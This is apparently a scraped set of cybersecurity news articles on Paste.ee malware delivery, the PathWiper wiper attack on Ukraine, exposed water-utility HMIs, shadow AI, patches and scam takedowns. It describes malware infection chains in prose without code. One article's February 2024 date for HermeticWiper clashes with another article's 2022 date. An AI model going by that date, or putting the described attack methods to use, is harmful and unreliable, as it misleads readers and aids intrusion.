        "content": "The widespread text-sharing website Paste.ee has been used as a weapon by bad actors to spread powerful malware strains like XWorm and AsyncRAT, which is a worrying trend for cybersecurity professional.\n\nThis tactic represents a significant shift in phishing and malware delivery strategies, exploiting a trusted service to bypass traditional security defenses.\n\nUnveiling a New Cyber Threat Vector\n\nHunt researchers have identified a surge in campaigns leveraging Paste.ee to host malicious payloads and scripts, often disguised as innocuous text snippets, which are then disseminated via phishing emails and social engineering tactics.\n\n- Advertisement -\n Phishing URLs Related to passte.ee\n\nThis abuse of legitimate platforms underscores the evolving sophistication of threat actors who continuously adapt to evade detection by anti-malware solutions and firewalls.\n\nThe operational methodology behind these attacks is both intricate and alarmingly efficient. Cybercriminals upload malicious scripts or encoded payloads to Paste.ee, exploiting its accessibility and anonymity features.\n\nThese payloads often include links or scripts that, once accessed, initiate the download of XWorm a versatile remote access trojan (RAT) capable of keylogging, file theft, and system manipulation or AsyncRAT, known for its stealth and credential-stealing capabilities.\n\nThe URLs are embedded in phishing emails mimicking legitimate correspondence, often using HTML-based tactics to obscure the malicious intent.\n\nAdditionally, attackers have been observed scheduling tasks on compromised systems to ensure persistence, exploiting vulnerabilities in scheduled task configurations to execute malware at predetermined intervals.\n\nXWorm Configuration\nTechnical Breakdown of the Attack Mechanism\n\nThe use of Paste.ee not only facilitates payload delivery but also complicates traceability, as the platform’s servers inadvertently act as intermediaries in the attack chain.\n\nThis exploitation of trusted web services mirrors tactics seen in Glitch-hosted phishing campaigns, where legitimate platforms are repurposed for nefarious ends.\n\nFurthermore, the malware strains involved exhibit advanced evasion techniques, such as polymorphic code to dodge signature-based detection and encrypted communications to hinder network analysis with tools like Wireshark.\n\nThis multi-layered approach poses a significant challenge to incident response teams, requiring deep packet inspection and behavioral analysis to identify and mitigate the threat effectively.\n\nThe implications of this campaign extend beyond immediate data theft, potentially compromising entire networks through lateral movement facilitated by AsyncRAT’s remote control features.\n\nLatin American banking sectors, already targeted by infostealer malware like Lumma and DCRat, face heightened risks as these RATs could be tailored to steal sensitive financial credentials.\n\nDrawing parallels with tactics employed by Advanced Persistent Threat (APT) groups, such as Iranian and Chinese operations, the strategic use of legitimate platforms for malware delivery suggests a level of sophistication that could indicate state-sponsored involvement or highly organized cybercrime syndicates.\n\nDefensive measures must prioritize user awareness to recognize phishing attempts, alongside deploying robust endpoint protection capable of detecting anomalous script execution.\n\nWeb security tools like mod_security2 can be configured to flag suspicious traffic originating from text-sharing platforms, while organizations must remain vigilant against credential stuffing attacks that often follow initial RAT infections.\n\nAs this threat evolves, continuous monitoring and threat intelligence sharing are paramount to stay ahead of adversaries exploiting trusted services like Paste.ee.\n\nIndicators of Compromise (IOC)\nType\tIndicator\tDescription\nURL\tpaste.ee/p/[malicious_id]\tMalicious Paste.ee link\nMalware\tXWorm\tRemote Access Trojan\nMalware\tAsyncRAT\tCredential Stealing RAT\nBehavior\tScheduled Task Execution\tPersistence Mechanism\n\nTo Upgrade Your Cybersecurity Skills, Take Diamond Membership With 150+ Practical Cybersecurity Courses Online – Enroll Here",

Employees across all industries immediately recognized the potential of generative AI to boost productivity, streamline communication and accelerate work. Like so many waves of consumer-first IT innovation before it—file sharing, cloud storage and collaboration platforms—AI landed in the enterprise not through official channels, but through the hands of employees eager to work smarter.\n\nFaced with the risk of sensitive data being fed into public AI interfaces, many organizations responded with urgency and force: They blocked access. While understandable as an initial defensive measure, blocking public AI apps is not a long-term strategy—it's a stopgap. And in most cases, it's not even effective.\n\nThe Zscaler ThreatLabz team has been tracking AI and machine learning (ML) traffic across enterprises, and the numbers tell a compelling story. In 2024 alone, ThreatLabz analyzed 36 times more AI and ML traffic than in the previous year, identifying over 800 different AI applications in use.\n\nBlocking has not stopped employees from using AI. They email files to personal accounts, use their phones or home devices, and capture screenshots to input into AI systems. These workarounds move sensitive interactions into the shadows, out of view from enterprise monitoring and protections. The result? A growing blind spot is known as Shadow AI.\n\nBlocking unapproved AI apps may make usage appear to drop to zero on reporting dashboards, but in reality, your organization isn't protected; it's just blind to what's actually happening.\n\nWe've been here before. When early software as a service tool emerged, IT teams scrambled to control the unsanctioned use of cloud-based file storage applications. The answer wasn't to ban file sharing though; rather it was to offer a secure, seamless, single-sign-on alternative that matched employee expectations for convenience, usability, and speed.\n\nHowever, this time around the stakes are even higher. With SaaS, data leakage often means a misplaced file. With AI, it could mean inadvertently training a public model on your intellectual property with no way to delete or retrieve that data once it's gone. There's no \"undo\" button on a large language model's memory.\n\nBefore an organization can intelligently govern AI usage, it needs to understand what's actually happening. Blocking traffic without visibility is like building a fence without knowing where the property lines are.\n\nWe've solved problems like these before. Zscaler's position in the traffic flow gives us an unparalleled vantage point. We see what apps are being accessed, by whom and how often. This real-time visibility is essential for assessing risk, shaping policy and enabling smarter, safer AI adoption.\n\nNext, we've evolved how we deal with policy. Lots of providers will simply give the black-and-white options of \"allow\" or \"block.\" The better approach is context-aware, policy-driven governance that aligns with zero-trust principles that assume no implicit trust and demand continuous, contextual evaluation. Not every use of AI presents the same level of risk and policies should reflect that.\n\nFor example, we can provide access to an AI application with caution for the user or allow the transaction only in browser-isolation mode, which means users aren't able to paste potentially sensitive data into the app. Another approach that works well is redirecting users to a corporate-approved alternative app which is managed on-premise. This lets employees reap productivity benefits without risking data exposure. If your users have a secure, fast, and sanctioned way to use AI, they won't need to go around you.\n\nLast, Zscaler's data protection tools mean we can allow employees to use certain public AI apps, but prevent them from inadvertently sending out sensitive information. Our research shows over 4 million data loss prevention (DLP) violations in the Zscaler cloud, representing instances where sensitive enterprise data—such as financial data, personally identifiable information, source code, and medical data—was intended to be sent to an AI application, and that transaction was blocked by Zscaler policy. Real data loss would have occurred in these AI apps without Zscaler's DLP enforcement.\n\nThis isn't about stopping AI adoption—it's about shaping it responsibly. Security and productivity don't have to be at odds. With the right tools and mindset, organizations can achieve both: empowering users and protecting data.\n\nLearn more at zscaler.com/security",

        "title": "Inside the Mind of the Adversary: Why More Security Leaders Are Selecting AEV",
        "content": "날짜: Jun 06, 2025\n\n본문:\nCybersecurity involves both playing the good guy and the bad guy. Diving deep into advanced technologies and yet also going rogue in the Dark Web. Defining technical policies and also profiling attacker behavior. Security teams cannot be focused on just ticking boxes, they need to inhabit the attacker's mindset.\n\nThis is where AEV comes in.\n\nAEV (Adversarial Exposure Validation) is an advanced offense technology that mimics how adversaries will attack your system, while providing remediation strategies. It lets you discover and address how your environment can be exploited and what the impact of the exploitation could be, in a dynamic and ongoing way.\n\nIn this article, we'll share everything you need to know about AEV, and how your team can leverage it to build continuous resilience against attacks.\n\nAccording to the Gartner® Market Guide for Adversarial Exposure Validation (March 2025), AEV is defined as \"technologies that deliver consistent, continuous, and automated evidence of the feasibility of an attack.\" AEV operates by emulating cyber-attacks, providing organizations with an understanding of how attackers can infiltrate their networks. This allows organizations to take relevant security measures to effectively remediate security gaps.\n\nAEV technologies effectively consolidate previously isolated security testing methods, like Automated Penetration Testing and BAS (Breach and Attack Simulation). Gartner says \"As the two markets developed and overlapping capabilities increased, the two functions converged to unite offensive technologies\".\n\nAEV's focus is on replicating an actual adversary's mindset. By combining the breadth of automated pentesting and the impact-driven focus of BAS, AEV enables continuous testing that mirrors how real attackers adapt over time. Organizations can continuously emulate how attackers operate, providing a more insightful confirmation of vulnerabilities and how to best fix them.\n\nAEV emerged as a technological solution to support CTEM (Continuous Threat Exposure Management) practices. CTEM is an all-encompassing program that helps organizations identify vulnerabilities and exposures, determine the risk profiles of digital assets, prioritize their risk mitigation, and then monitor remediation.\n\nHere's how AEV facilitates CTEM:\n\nAEV automatically identifies how an attacker might chain together multiple vulnerabilities across different environments. This makes it a staple in any red teamer's toolkit.\n\nWith AEV, red teams can more easily model attack scenarios. This includes complex ones like attackers hopping between cloud infrastructure and on-prem systems or pivoting through different network segments, while overcoming existing controls and combining low-scoring exposures into a full-scale breach.\n\nEquipped with information provided by AEV, red teams gain a clear view of how a determined attacker might move laterally, allowing them to scale their efforts and fast-track mitigation. For the organization, AEV ensures cost-effective red-teaming and even allows for entry-level red-teamers to provide quality results. GenAI is expected to augment this even further by providing ideas and explanations for complex attack scenarios.\n\nFor blue teamers, AEV provides a strong head start. With AEV, defenders can see in the face of an attack which protections are really robust, which require strengthening, and which controls are in fact redundant. This helps defenders ensure that their security posture is working at its best using a trending analysis to show that the program works as expected.\n\nBlue teams can use insights and data from AEVs for:\n\nAEV is designed to provide continuous, automated, and realistic simulations of how attackers could exploit weaknesses in an organization's defenses. No wonder it is quickly emerging as a pivotal technology in cybersecurity. With AEV, security teams are getting that proven validation of how exposures in their environment could be exploited and to what end, enabling smarter prioritization and effective remediation at a faster pace. This necessary clarity is key to fostering cyber resilience.\n\nTo learn more about how to implement AEV, and its role within a wider CTEM practice, register to attend Xposure, Pentera's Exposure Management Summit.",

        "title": "New PathWiper Data Wiper Malware Disrupts Ukrainian Critical Infrastructure in 2025 Attack",
        "content": "날짜: Jun 06, 2025\n\n본문:\nA critical infrastructure entity within Ukraine was targeted by a previously unseen data wiper malware named PathWiper, according to new findings from Cisco Talos.\n\n\"The attack was instrumented via a legitimate endpoint administration framework, indicating that the attackers likely had access to the administrative console, that was then used to issue malicious commands and deploy PathWiper across connected endpoints,\" researchers Jacob Finn, Dmytro Korzhevin, and Asheer Malhotra said in an analysis published Thursday.\n\nThe attack is assessed to be the work of a Russia-nexus advanced persistent threat (APT) actor based on the tradecraft observed and the overlapping capabilities with destructive malware used in attacks against Ukraine.\n\nTalos said the commands issued by the administrative tool's console were received by its client running on the victim endpoints and then executed as a batch (BAT) file.\n\nThe BAT file, in turn, consisted of a command to run a malicious Visual Basic Script (VBScript) file in the Windows TEMP folder called \"uacinstall.vbs,\" that was also pushed to the machines via the administrative console. The VBScript, for its part, dropped the wiper binary under the name \"sha256sum.exe\" in the same folder and executed it.\n\n\"Throughout the course of the attack, filenames and actions used were intended to mimic those deployed by the administrative utility's console, indicating that the attackers had prior knowledge of the console and possibly its functionality within the victim enterprise's environment,\" Talos said.\n\nOnce launched, PathWiper is designed to gather a list of connected storage media, including physical drive names, volume names and paths, and network drive paths. The wiper then proceeds to create one thread per drive and volume for every path recorded and overwrites the contents of the artifacts with randomly generated bytes.\n\nSpecifically, it targets: Master Boot Record (MBR), $MFT, $MFTMirr, $LogFile, $Boot, $Bitmap, $TxfLog, $Tops, and $AttrDef. In addition, PathWiper irrevocably destroys files on disk by overwriting them with randomized bytes and attempts to dismount volumes.\n\nPathWiper has been found to share some level of similarity with HermeticWiper (aka FoxBlade, KillDisk, or NEARMISS), which was detected coinciding with Russia's full-scale military invasion of Ukraine in February 2024. The HermeticWiper malware is attributed to the Russia-linked Sandworm group.\n\nWhile both wipers attempt to corrupt the MBR and NTFS-related artifacts, it bears noting that HermeticWiper and PathWiper differ in the manner the data corruption mechanism is used against identified drives and volumes.\n\n\"The continued evolution of wiper malware variants highlights the ongoing threat to Ukrainian critical infrastructure despite the longevity of the Russia-Ukraine war,\" the researchers said.\n\nThe discovery of a new breed of wiper malware against Ukraine comes as Russian cybersecurity company BI.ZONE uncovered two new campaigns undertaken by Silent Werewolf in March 2025 to infect Moldovan and Russian companies with malware.\n\n\"The attackers employed two separate loader instances to retrieve the malicious payload from their C2 server,\" the company said. \"Unfortunately, the payload itself was not available at the time of this research. However, a retrospective analysis of similar Silent Werewolf campaigns suggests that the threat actor used XDigo malware.\"\n\nSome of the targets of the attacks include nuclear, aircraft, instrumentation, and mechanical engineering sectors in Russia. The starting point is a phishing email containing a ZIP file attachment that, in turn, includes an LNK file and a nested ZIP archive. The second ZIP file consists of a legitimate binary, a malicious DLL, and a decoy PDF.\n\nUnpacking and launching the Windows shortcut file triggers the extraction of the nested archive and ultimately causes the rogue DLL to be sideloaded via the legitimate executable (\"DeviceMetadataWizard.exe\"). The DLL is a C# loader (\"d3d9.dll\") that's designed to retrieve the next-stage payload from a remote server and display the lure document to the victim.\n\n\"The adversaries appear to run checks on target systems,\" BI.ZONE said. \"If a target host does not meet certain criteria, the Llama 2 large language model (LLM) in GGUF format is downloaded from hxxps://huggingface[.]co/TheBloke/Llama-2-70B-GGUF/resolve/main/llama-2-70b.Q5_K_M.gguf.\"\n\n\"This hinders the comprehensive analysis of the entire attack and allows the threat actor to bypass defenses such as sandboxes.\"\n\nThe cybersecurity firm said it observed a second campaign that same month targeting unknown sectors in Moldova and, likely, Russia using the same C# loader, but via phishing lures related to official vacation schedules and recommendations for protecting corporate information infrastructure against ransomware attacks.\n\nThe cyber espionage group, per BI.ZONE, is believed to be active at least since 2011, targeting a wide range of companies in Russia, Belarus, Ukraine, Moldova and Serbia. The attacks are characterized by the use of phishing lures to deliver malware such as XDSpy, XDigo, and DSDownloader.\n\nIn recent months, Russian state-owned companies and organizations spanning technology, telecommunications, and production verticals are also said to have come under cyber assaults from a pro-Ukrainian hacktivist group codenamed BO Team (aka Black Owl, Hoody Hyena, and Lifting Zmiy).\n\n\"BO Team is a serious threat aimed both at causing maximum damage to the victim and at extracting financial benefits,\" Kaspersky researchers said in a report last week, detailing the threat actor's ability to sabotage victim's infrastructure and, in some instances, even resorts to data encryption and extortion.\n\nActive since at least January 2024, attacks mounted by the hacktivist cluster are known to leverage post-exploitation frameworks, including Mythic and Cobalt Strike, as well as legitimate remote access and tunneling tools. The group also has a history of accessing confidential data and publishing information about successful attacks in its Telegram channel BO Team.\n\nInitial access to target networks is accomplished by sending phishing emails containing booby-trapped attachments that, when opened, activate an infection chain designed to deploy known commodity malware families like DarkGate, BrockenDoor, and Remcos RAT. Also used are tools such as HandleKatz and NanoDump for dumping LSASS and creating LSASS dumps, respectively.\n\nArmed with the remote access, BO Team has been observed destroying file backups, deleting files using the SDelete utility, and additionally dropping the Windows version of the Babuk encryptor to demand a ransom in exchange for regaining access.\n\nSome of the other activities carried out by the threat actor are listed below -\n\n\"The BO Team group poses a significant threat to Russian organizations due to its unconventional approach to conducting attacks,\" Kaspersky said. \"Unlike most pro-Ukrainian hacktivist groups, BO Team actively uses a wide arsenal of malware, including backdoors such as BrockenDoor, Remcos, and DarkGate.\"\n\n\"These features confirm the high level of autonomy of the group and the absence of stable connections with other representatives of the pro-Ukrainian hacktivist cluster. In the public activity of BO Team, there are practically no signs of interaction, coordination or exchange of tools with other groups. This once again emphasizes its unique profile within the current hacktivist landscape in Russia.\"",

In addition, valuable evidence in the form of computers, storage devices, digital video recorders, and phones has been seized.\n\nThe CBI said the operation criminal enterprise leveraged advanced social engineering techniques and \"technical subterfuge\" to deceive victims and extract money under false pretenses.\n\n\"With the growth of cybercrime-as-a-service, connectivity among cybercriminals has increased and become more global,\" Microsoft's Steven Masada said. \"We must continue to look at the full ecosystem in which these actors operate and coordinate with multiple international partners to meaningfully address cybercrime.\"\n\nThe tech giant further said it has been closely working with the Japan Cybercrime Control Center (JC3) to uncover the fake technical support scam, enabling it to take down approximately 66,000 malicious domains and URLs globally since May 2024.\n\nThe cross-sector collaboration, Redmond added, made it possible to identify the broader network behind these operations, which includes pop-up creators, search-engine optimizers, lead generators, logistics and technology providers, payment processors, and talent providers.\n\n\"These actors used generative AI to scale their operations, including to identify potential victims, automate the creation of malicious pop-up windows, and perform language translations to target Japanese victims,\" Masada said.\n\n\"This activity highlights the increasingly sophisticated tactics employed by cybercriminals and underscores the importance of proactive global collaboration to protect victims. \"\n\nThe action comes shortly after Reuters reported that the recently disclosed data breach at Coinbase has links to India-based customer support representatives TaskUs, who the threat actors bribed to steal customer data from the cryptocurrency exchange.\n\nThe breach is said to have been first identified in January 2025, with TaskUs stating that it had fired two employees after they illegally accessed information from a Coinbase around the same time. Coinbase has since terminated its contract with the company.\n\nThe developments also follow the arrest of 20 suspects across 12 countries between March and May 2025 in an international operation on charges of creating and distributing child sexual abuse material (CSAM).\n\n\"Spanish authorities arrested seven suspects, including a healthcare worker and a teacher,\" INTERPOL said. \"The healthcare worker allegedly paid minors from Eastern Europe for explicit images, while the teacher is accused of possessing and sharing child sexual abuse material via various online platforms.\"\n\nAnother 10 suspects have been arrested from different Latin American countries, including three in El Salvador and a teacher in Panama.

That label, short for Supervisory Control and Data Acquisition, is typically associated with monitoring systems in industrial control environments. Censys found the same certificate distinguished name (DN) across several instances of the uncommon browser-based HMI platform.\n\nCurious, the team fetched screenshots from each IP address and found themselves staring at live process graphics from water-treatment plants: tank levels drifting up and down, chlorine pumps cycling on and off, and alarms flashing in real time.\n\nDigging deeper, the researchers realized that every affected utility was using the identical web server layout generated by the HMI software. The researchers parsed the title tags into a spreadsheet that displayed the product, the owner and the location and found strings confirming the hosts were indeed municipal water facilities.\n\nCensys researchers say all the systems were found in three states: Authenticated (credentials required), Read-only (viewable without control), and the unnerving Unauthenticated (full access without credentials).\n\n“40 systems were fully unauthenticated and controllable by anyone with a browser,” the company said.\n\nBecause the targets were public utilities, Censys skipped the usual slow, one-by-one disclosure and sent a bulk report to the US Environmental Protection Agency and the unnamed HMI vendor.\n\nThe spreadsheet listed every IP, port and likely location, along with each site’s security state. Within nine days, Censys said the EPA reported that 24 percent of the exposed systems had been firewalled or hardened. A month later, that figure jumped to 58 percent after the vendor pushed guidance on multifactor authentication and stronger access rules.\n\n“What began as over 300 read-only or unauthenticated systems in October 2024 has dropped to fewer than 20 as of our most recent scan in May 2025. While not quite at zero read-only or unauthenticated instances, this is the type of remediation that defenders and practitioners dream of,” the Censys research team said.\n\nLate last year, the US government issued an urgent call for organizations in the water and wastewater systems sector to ensure that internet-exposed human-machine interfaces (HMIs) providing access to industrial machines are properly secured against cyberattacks.\n\nHMIs are components of device or software applications, such as keyboards and touchscreens, that enable operational technology (OT) owners and operators to monitor and control SCADA systems, often remotely.\n\nAccording to a fact sheet (PDF) from the Environmental Protection Agency (EPA) and the US cybersecurity agency CISA, exposed HMIs in water and wastewater systems could allow threat actors to access information about or tamper with industrial control systems (ICS).\n\n“Threat actors have demonstrated the capability to find and exploit internet-exposed HMIs with cybersecurity weaknesses easily.  For example, in 2024, pro-Russia hacktivists manipulated HMIs at water and wastewater systems, causing water pumps and blower equipment to exceed their normal operating parameters,” the two agencies warned.\n\nRelated: US Lawmakers Reintroduce Bill to Boost Rural Water Cybersecurity\n\nRelated: US Water Facilities Urged to Secure Access to Internet-Exposed HMIs\n\nRelated: 300 Drinking Water Systems in US Exposed to Disruptive Hacker Attacks\n\nRelated: American Water Confirms Hack: Customer Portal Suspended",

The update also resolves seven other security defects, including four rated ‘high severity’ that could lead to remote code execution (RCE).\n\nWhile all four RCE flaws require authentication to be exploited, they could be chained with the critical authentication bypass to fully compromise vulnerable systems.\n\nThe remaining vulnerabilities could be exploited to perform server-side request forgery (SSRF) attacks, and to delete arbitrary files or leak data by performing path traversal attacks. Their exploitation requires authentication, but the mechanism can be bypassed, ZDI warns.\n\nRelated: HPE Says Personal Information Stolen in 2023 Russian Hack\n\nRelated: Dell, HPE, MediaTek Patch Vulnerabilities in Their Products\n\nRelated: Vulnerabilities Patched by Juniper, VMware and Zoom\n\nRelated: Nvidia Patches Vulnerabilities That Could Let Hackers Exploit AI Services",

        "content": "날짜: 2025-06-06\n\n요약: Noteworthy stories that might have slipped under the radar: FBI issues an alert on BadBox 2 botnet, NSO disputing the $168 million WhatsApp fine, 1,000 people left CISA since Trump took office.\n\n본문:\nSecurityWeek’s cybersecurity news roundup provides a concise compilation of noteworthy stories that might have slipped under the radar.\n\nWe provide a valuable summary of stories that may not warrant an entire article, but are nonetheless important for a comprehensive understanding of the cybersecurity landscape.\n\nEach week, we curate and present a collection of noteworthy developments, ranging from the latest vulnerability discoveries and emerging attack techniques to significant policy changes and industry reports.\n\nHere are this week’s stories:\n\nFBI alert on BadBox 2 botnet\n\nThe FBI has issued an alert on BadBox 2, a botnet targeting IoT devices such as streaming products, projectors, vehicle infotainment systems, picture frames, and other devices, mostly those manufactured in China. The botnet, estimated to have ensnared over 1 million devices, was partially disrupted earlier this year. The initial BadBox botnet was discovered in 2023.\n\nNSO says it can’t pay $167 million in ‘unlawful’ damages to WhatsApp\n\nSpyware vendor NSO Group has appealed (PDF) a jury’s decision dictating it should pay $167 million in damages to WhatsApp, saying the award is unlawful. The order was announced last month, in a lawsuit filed in 2019 over NSO’s alleged role in facilitating government spying on 1,400 users’ mobile phones. According to NSO, WhatsApp should not be awarded more than $1.77 million.\n\nVanta vulnerability exposed customer data\n\nVanta has resolved a vulnerability that exposed its customers’ data to other Vanta customers. Fewer than 20% of third-party integrations were exposed, the company told TechCrunch. All impacted customers, likely hundreds of them, were notified, the security and compliance automation firm said.\n\nGoogle survey finds scams are increasing\n\nMore than half of online users in the US are seeing an increase in scams, and roughly one in five has experienced a data breach, a new Google survey shows. While most consumers believe they can spot a scam, many of them, mainly Gen X and Baby Boomers, continue to use traditional authentication methods, such as passwords and 2FA. Gen Z and Millennials, on the other hand, use passkeys and social sign-ins more frequently.\n\nFirefox gets crypto scam prevention\n\nFirefox now has an early detection feature meant to identify and block crypto scam extensions before they become popular among users. The system involves indicators of risk for wallet extensions, which are submitted to AMO (addons.mozilla.org), and which will trigger an alert once a certain risk threshold is reached.\n\nHedera Hashgraph users targeted by fraudsters\n\nScammers are targeting Hedera Hashgraph network users through the NFT airdrop feature in non-custodial wallets, the FBI warns (PDF). Users may receive fake rewards or incentives through the airdrop feature, which are accompanied by a plaintext “memo” section containing a URL to a third-party site. The URL links the victim’s cryptocurrency wallet to the website’s dApps function, which often requires the user to enter their login credentials and seed phrases, allowing the attackers to steal their funds.\n\nUS telecoms hacked by China earlier than believed\n\nChinese hackers broke into the systems of an unnamed US telecommunications company in the summer of 2023 and stayed there for seven months before they were discovered, Bloomberg [paywalled] has learned. This means China hacked into US telecom systems earlier than believed.\n\n1,000 people left CISA since Trump came to office\n\nRoughly 1,000 people have left CISA since Donald Trump took office, Axios learned. CISA, which faces significant budget cuts, has lost nearly one-third of its workforce. Hundreds of CISA workers reportedly took up the DHS’s buyout offer and left the cybersecurity agency. The White House had been planning to cut 1,000 positions at CISA during the 2026 fiscal year.\n\nMicrosoft launches European Security Program\n\nMicrosoft announced the launch of a new European Security Program that adds to the tech giant’s global Government Security Program. The program, which is free of charge for European governments, focuses on increasing AI-based threat intelligence sharing, additional investments to strengthen cybersecurity capacity and resilience, and expanding partnerships to disrupt cyberattacks and dismantle cybercrime networks.\n\nRelated: In Other News: PoC for Fortinet Bug, AI Model Subverts Shutdown, RAT Source Code Leaked\n\nRelated: In Other News: Volkswagen App Hacked, DR32 Sentenced, New OT Security Solution",

        "content": "날짜: 2025-06-06\n\n요약: A Russia-linked threat actor has used the destructive malware dubbed PathWiper against a critical infrastructure organization in Ukraine.\n\n본문:\nRussian threat actors are once again targeting Ukraine’s critical infrastructure with destructive malware, a fresh report from Cisco Talos shows.\n\nWiper attacks against Ukraine were executed in January and February 2022, in coordination with Russia’s assault on the country, with malware such as WhisperGate, HermeticWiper, IsaacWiper and CaddyWiper identified and analyzed. In April, Industroyer2 was used against industrial control systems (ICS).\n\nAs Russia intensified its activities in cyberspace, the attacks continued and Ukraine’s largest mobile network operator, Kyivstar, had its IT infrastructure partially destroyed in a December 2023 cyberattack.\n\nNow, Talos says a critical infrastructure entity within Ukraine fell victim to a destructive attack in which new malware, dubbed PathWiper, was used.\n\nThe new malware shares similarities with HermeticWiper, which has been attributed to Sandworm, also tracked as Seashell Blizzard, APT44, Iridium, TeleBots, and Voodoo Bear, an APT group associated with GRU, Russia’s military intelligence.\n\nBoth wipers, Talos explains, target the master boot record (MBR) and NTFS-related artifacts for corruption, albeit the mechanisms differ. PathWiper seeks all connected drives and volumes, identifies volume labels, and documents valid records, while HermeticWiper simply enumerates physical drives from 0 to 100.\n\nAs part of the PathWiper attack, a legitimate endpoint administration framework was used to execute malicious commands and deploy the wiper. The attackers used filenames and actions mimicking those of the utility’s console.\n\n“Any commands issued by the administrative tool’s console were received by its client running on the endpoints. The client then executed the command as a batch (BAT) file, with the command line partially resembling that of Impacket command executions, though such commands do not necessarily indicate the presence of Impacket in an environment,” Talos explains.\n\nWhen executed, PathWiper attempted to dismount volumes and to replace the contents of file system artifacts with random data, using one thread per drive and volume for each identified path. Targeted artifacts include MBR, $MFT, $MFTMirr, $LogFile, $Boot, $Bitmap, $TxfLog, $Tops, and $AttrDef.\n\nSome of the 2022 wiper attacks against Ukraine were attributed to Cadet Blizzard, an APT operating on behalf of GRU. Last year, the US announced charges against a member of the group.\n\nRelated: Kapeka: A New Backdoor in Sandworm’s Arsenal of Aggression\n\nRelated: Andrei Tarasov: Inside the Journey of a Russian Hacker on the FBI’s Most Wanted List\n\nRelated: Recorded Future Tagged as ‘Undesirable’ in Russia\n\nRelated: Google Details Recent Ukraine Cyberattacks",
